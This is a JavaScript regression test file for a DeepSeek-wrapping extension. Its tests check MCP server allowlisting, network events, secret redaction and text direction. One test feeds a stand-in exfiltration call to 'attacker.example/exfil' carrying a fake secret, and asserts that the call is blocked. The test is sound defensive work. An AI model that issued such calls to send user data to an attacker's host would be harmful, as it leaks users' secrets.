// Regression tests for the 2026-10-29 World-Class Audit hardening pass.
// Every test in this file failed against upstream main (e9c20fe) before its
// corresponding surgical fix was applied.
// Run: npm run test:engine

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const ASSETS = path.join(here, '../../main/bds-assets/bds');

// ── BUG-01: Unconfigured & disabled MCP servers must fail closed ────────────

test('BUG-01: sdMcpOne refuses unconfigured and disabled MCP servers without contacting the bridge', async () => {
  const CONTENT = fs.readFileSync(path.join(ASSETS, 'content.js'), 'utf8');
  const slice = (from, to) => {
    const a = CONTENT.indexOf(from);
    const b = CONTENT.indexOf(to, a);
    assert.ok(a >= 0 && b > a, `engine code moved: ${from}`);
    return CONTENT.slice(a, b);
  };
  const MCP = slice('let BW=Promise.resolve(),sdMcpQ=null;', 'function sdMcpSb(e){')
    + slice('function sdMcpSb(e){', 'async function sdMcpRun(')
    + slice('async function sdMcpRun(', '}function ') + '}';

  const bridgeCalls = [];
  const sent = [];
  const runEvents = [];
  const ctx = {
    console: { log() {}, error() {} },
    setTimeout, Promise, JSON, Math, Object, Array, String, Number, Error, Blob, File, Set,
    B: {
      mcpServers: [
        { name: 'trusted', serverUrl: 'https://trusted.example/mcp', apiKey: 'k1', enabled: true },
        { name: 'disabled-srv', serverUrl: 'https://disabled.example/mcp', apiKey: 'k2', enabled: false },
      ],
      settings: { mcpInlineMaxChars: 8000 },
    },
    vb: new Set(),
    tCe: (e) => e,
    SW: (e) => String(e || '').replace(/\/+$/, ''),
    dt() {},
    q_e: (r) => r.text,
    nc: async (text, label) => { sent.push({ text, label }); return true; },
    ml: async (file, text) => { sent.push({ text, body: await file.text() }); return true; },
    __sdRunEvent: (ev) => runEvents.push(ev),
    chrome: {
      runtime: {
        lastError: null,
        sendMessage(msg, cb) {
          bridgeCalls.push({ serverUrl: msg.serverUrl, toolName: msg.toolName, apiKey: msg.apiKey });
          setTimeout(() => cb({ ok: true, result: { text: 'ok:' + msg.toolName } }), 1);
        },
      },
    },
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  vm.runInContext(MCP + ';window.nCe=nCe;', ctx);

  // 1. Prompt-injected / hallucinated attacker URL is refused BEFORE chrome.runtime.sendMessage
  await ctx.nCe('https://attacker.example/exfil', 'leak', { secret: '123' });
  assert.equal(bridgeCalls.length, 0, 'unconfigured MCP URL must never reach the native bridge');
  assert.equal(sent.length, 1);
  assert.match(sent[0].text, /\[SDS:AUTO_MCP_ERROR\]/);
  assert.match(sent[0].text, /Unconfigured MCP server/i);

  // 2. Explicitly disabled server in B.mcpServers is also refused BEFORE contacting bridge
  await ctx.nCe('https://disabled.example/mcp', 'ping', {});
  assert.equal(bridgeCalls.length, 0, 'disabled MCP server must never reach the native bridge');
  assert.equal(sent.length, 2);
  assert.match(sent[1].text, /disabled/i);

  // 3. Enabled configured server and built-in Linux sandbox still work normally
  await ctx.nCe('trusted', 'search', { q: 'docs' });
  await ctx.nCe('sandbox://linux', 'run', { command: 'uname -a' });
  assert.deepEqual(
    bridgeCalls.map((c) => [c.serverUrl, c.toolName]),
    [
      ['https://trusted.example/mcp', 'search'],
      ['sandbox://linux', 'run'],
    ]
  );
});

// ── BUG-02: injected.js must dispatch bds:network-state (not "undefined") ───

test('BUG-02: injected.js dispatches bds:network-state start/end events with activeCompletionRequests count', async () => {
  const INJECTED = fs.readFileSync(path.join(ASSETS, 'injected.js'), 'utf8');
  const bootStart = INJECTED.lastIndexOf('(function(){"use strict";const e={configUpdate:');
  assert.ok(bootStart > 0, 'injected.js bootstrap IIFE found');

  const dispatched = [];
  let fetchResolve;
  const ctx = {
    console: { log() {}, warn() {}, error() {} },
    JSON, String, Number, Boolean, Array, Object, Map, Set, Date, Math, Promise, RegExp, Error,
    encodeURIComponent, decodeURIComponent, setTimeout, clearTimeout,
    CustomEvent: class CustomEvent {
      constructor(type, init) {
        this.type = String(type);
        this.detail = init ? init.detail : undefined;
      }
    },
    localStorage: { length: 0, key: () => null, getItem: () => null, setItem() {}, removeItem() {} },
    sessionStorage: { length: 0, key: () => null, getItem: () => null, setItem() {}, removeItem() {} },
    document: { cookie: '' },
    location: { href: 'https://chat.deepseek.com/', pathname: '/' },
    XMLHttpRequest: function XMLHttpRequest() {},
    fetch: () => new Promise((r) => { fetchResolve = r; }),
  };
  ctx.XMLHttpRequest.prototype = { open() {}, send() {}, setRequestHeader() {}, addEventListener() {} };
  const listeners = new Map();
  ctx.addEventListener = (type, fn) => {
    if (!listeners.has(type)) listeners.set(type, []);
    listeners.get(type).push(fn);
  };
  ctx.dispatchEvent = (ev) => {
    dispatched.push({ type: ev.type, detail: ev.detail });
    for (const fn of listeners.get(ev.type) || []) fn(ev);
    return true;
  };
  ctx.window = ctx;
  ctx.globalThis = ctx;

  vm.createContext(ctx);
  vm.runInContext(INJECTED, ctx);

  const pending = ctx.fetch('https://chat.deepseek.com/api/v0/chat/completion', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ prompt: 'hello', chat_session_id: 's1' }),
  });

  const undefinedEvents = dispatched.filter((e) => e.type === 'undefined');
  assert.equal(undefinedEvents.length, 0, 'must never dispatch CustomEvent("undefined")');

  const startEv = dispatched.find((e) => e.type === 'bds:network-state');
  assert.ok(startEv, 'expected bds:network-state event on completion start');
  const startPayload = JSON.parse(startEv.detail);
  assert.equal(startPayload.status, 'start');
  assert.equal(startPayload.activeCompletionRequests, 1);

  await new Promise((r) => setTimeout(r, 10));
  fetchResolve({
    ok: true,
    status: 200,
    headers: { get: () => 'text/plain' },
    clone() { return this; },
    text: async () => '',
    json: async () => ({}),
  });
  await pending;
  await new Promise((r) => setTimeout(r, 10));

  const netEvents = dispatched.filter((e) => e.type === 'bds:network-state').map((e) => JSON.parse(e.detail));
  assert.deepEqual(
    netEvents.map((e) => [e.status, e.activeCompletionRequests]),
    [['start', 1], ['end', 0]]
  );
});

// ── BUG-05: openNative must redact secrets & downloadStandalone must warn ───

test('BUG-05: sd-genui-viewer openNative redacts secrets before openGeneratedApp and downloadStandalone reports redactions', () => {
  const PROTO = fs.readFileSync(path.join(ASSETS, 'sd-genui-protocol.js'), 'utf8');
  const HOST = fs.readFileSync(path.join(ASSETS, 'sd-genui-host.js'), 'utf8');
  const FRAME = fs.readFileSync(path.join(ASSETS, 'sd-genui-frame.js'), 'utf8');
  const VIEWER = fs.readFileSync(path.join(ASSETS, 'sd-genui-viewer.js'), 'utf8');

  const openedHtml = [];
  const toasts = [];
  const makeEl = (tag = 'div') => ({
    tagName: String(tag).toUpperCase(),
    style: {},
    classList: { add() {}, remove() {}, toggle() {}, contains: () => false },
    children: [],
    appendChild(c) { this.children.push(c); return c; },
    removeChild() {},
    remove() {},
    setAttribute(k, v) { this[k] = v; },
    getAttribute(k) { return this[k] || null; },
    hasAttribute(k) { return k in this; },
    addEventListener() {},
    querySelector: () => null,
    querySelectorAll: () => [],
    textContent: '',
    innerHTML: '',
  });

  const ctx = {
    console, setTimeout, clearTimeout, setInterval: () => 0, clearInterval() {}, Promise, JSON, Math, Object, Array, String, Number, Boolean, Date, RegExp, Error, URL,
    btoa: (s) => Buffer.from(s, 'binary').toString('base64'),
    atob: (s) => Buffer.from(s, 'base64').toString('binary'),
    encodeURIComponent, decodeURIComponent,
    navigator: { language: 'en-US' },
    location: { href: 'https://chat.deepseek.com/', origin: 'https://chat.deepseek.com' },
    localStorage: { getItem: () => null, setItem() {}, removeItem() {} },
    addEventListener() {},
    removeEventListener() {},
    document: {
      documentElement: { lang: 'en', classList: { contains: () => false } },
      body: makeEl('body'),
      head: makeEl('head'),
      createElement: makeEl,
      querySelector: () => null,
      querySelectorAll: () => [],
      addEventListener() {},
    },
    AndroidBridge: {
      openGeneratedApp(html) { openedHtml.push(html); return true; },
      downloadBlob() { return true; },
    },
  };
  ctx.window = ctx;
  ctx.self = ctx;
  vm.createContext(ctx);
  vm.runInContext(PROTO, ctx);
  vm.runInContext(HOST, ctx);
  vm.runInContext(FRAME, ctx);
  ctx.__sdGenUIHost.toast = (msg) => toasts.push(String(msg));
  vm.runInContext(VIEWER, ctx);

  const secretArtifact = {
    id: 'secret-demo',
    kind: 'html-app',
    title: 'Key Holder',
    payload: { source: '<!doctype html><html><body><p>token sk-abcdefghijklmnopqrstuvwxyz123456</p></body></html>' },
  };

  ctx.__sdGenUIViewer.openNative(secretArtifact);
  assert.equal(openedHtml.length, 1, 'openGeneratedApp called once');
  assert.doesNotMatch(openedHtml[0], /sk-abcdefghijklmnopqrstuvwxyz123456/, 'API key must be redacted before caching/sharing in GeneratedAppActivity');
  assert.match(openedHtml[0], /sk-•••/, 'redaction placeholder present');

  // Verify standalone download toast reports redacted secret count just like source download:
  const dlFnMatch = VIEWER.match(/function downloadStandalone\(v\)\s*\{[\s\S]*?\n  \}/);
  assert.ok(dlFnMatch, 'downloadStandalone exists in sd-genui-viewer.js');
  assert.match(dlFnMatch[0], /r\.redacted/, 'downloadStandalone toast must surface redacted secret count');
});

// ── BUG-06: sd-native.js fixFieldDir must support contenteditable & inputs ──

test('BUG-06: sd-native fixFieldDir updates direction on contenteditable composer and text inputs, skipping code/url inputs', () => {
  const SRC = fs.readFileSync(path.join(ASSETS, 'sd-native.js'), 'utf8');
  const listeners = {};
  const ctx = {
    console, setTimeout, clearTimeout, Promise, JSON, Math, Object, Array, String, Date, Uint8Array, RegExp,
    Blob, File, URL,
    MutationObserver: class { observe() {} disconnect() {} },
    navigator: { language: 'en' },
    document: {
      documentElement: { lang: 'en' },
      body: {},
      querySelector: () => null,
      querySelectorAll: () => [],
      addEventListener(type, fn) { listeners[type] = fn; },
    },
    location: { pathname: '/', host: 'chat.deepseek.com', search: '' },
    fetch: async () => ({ ok: false, status: 404 }),
    AndroidBridge: {},
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  vm.runInContext(SRC, ctx);

  assert.equal(typeof listeners.input, 'function', 'input listener installed');

  const makeField = (tag, props = {}, attrs = {}) => {
    const store = { ...attrs };
    return {
      nodeType: 1,
      tagName: tag,
      ...props,
      hasAttribute: (k) => Object.prototype.hasOwnProperty.call(store, k),
      getAttribute: (k) => (Object.prototype.hasOwnProperty.call(store, k) ? store[k] : null),
      setAttribute: (k, v) => { store[k] = String(v); },
      removeAttribute: (k) => { delete store[k]; },
      closest: () => null,
      _attrs: store,
    };
  };

  // 1. Contenteditable composer gets dir="rtl" for Arabic and resets to "ltr" for Bengali/Latin
  const ce = makeField('DIV', { isContentEditable: true, textContent: 'مرحبا بالعالم' }, { contenteditable: 'true', role: 'textbox' });
  listeners.input({ target: ce });
  assert.equal(ce.getAttribute('dir'), 'rtl', 'contenteditable composer switches to RTL for Arabic');

  ce.textContent = 'بسم الله — এর অর্থ পরম করুণাময়ের নামে';
  listeners.input({ target: ce });
  assert.equal(ce.getAttribute('dir'), 'ltr', 'mixed Arabic-opening Bengali sentence stays explicitly LTR');

  ce.textContent = 'বাংলা ও English মিশ্র টেক্সট';
  listeners.input({ target: ce });
  assert.equal(ce.getAttribute('dir'), null, 'pure LTR text clears explicit dir override');

  // 2. <input type="search"> gets dir="rtl", while <input type="url"> and [spellcheck="false"] stay untouched
  const searchInput = makeField('INPUT', { type: 'search', value: 'البحث عن ملفات' });
  listeners.input({ target: searchInput });
  assert.equal(searchInput.getAttribute('dir'), 'rtl', 'search input follows RTL script');

  const urlInput = makeField('INPUT', { type: 'url', value: 'مرحبا' });
  listeners.input({ target: urlInput });
  assert.equal(urlInput.getAttribute('dir'), null, 'URL input is never flipped to RTL');

  const codeInput = makeField('INPUT', { type: 'text', value: 'مرحبا' }, { spellcheck: 'false' });
  listeners.input({ target: codeInput });
  assert.equal(codeInput.getAttribute('dir'), null, 'spellcheck=false code input is never flipped to RTL');
});

// ── BUG-07: sd-run.js _stripTags must strip legacy <BetterDeepSeek> too ─────

test('BUG-07: sd-run _stripTags strips both <SuperDeepSeek> and legacy <BetterDeepSeek> envelopes', () => {
  const SRC = fs.readFileSync(path.join(ASSETS, 'sd-run.js'), 'utf8');
  const ctx = {
    console, setTimeout, clearTimeout, setInterval, clearInterval, Promise, JSON, Math, Object, Array, String, Number, Boolean, Date, RegExp, Map, Set,
    navigator: { language: 'en' },
    localStorage: { getItem: () => null, setItem() {}, removeItem() {} },
    location: { href: 'https://chat.deepseek.com/', pathname: '/' },
    document: {
      documentElement: { lang: 'en' },
      body: null,
      addEventListener() {},
      querySelector: () => null,
      querySelectorAll: () => [],
    },
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  vm.runInContext(SRC, ctx);

  const cleaned = ctx.__sdRun._stripTags(
    '<BetterDeepSeek>\n[BDS:AUTO] hidden guidance\n</BetterDeepSeek>\n\n<superdeepseek>internal</superdeepseek>\n\nFinal summary for user.'
  );
  assert.equal(cleaned, 'Final summary for user.');
});
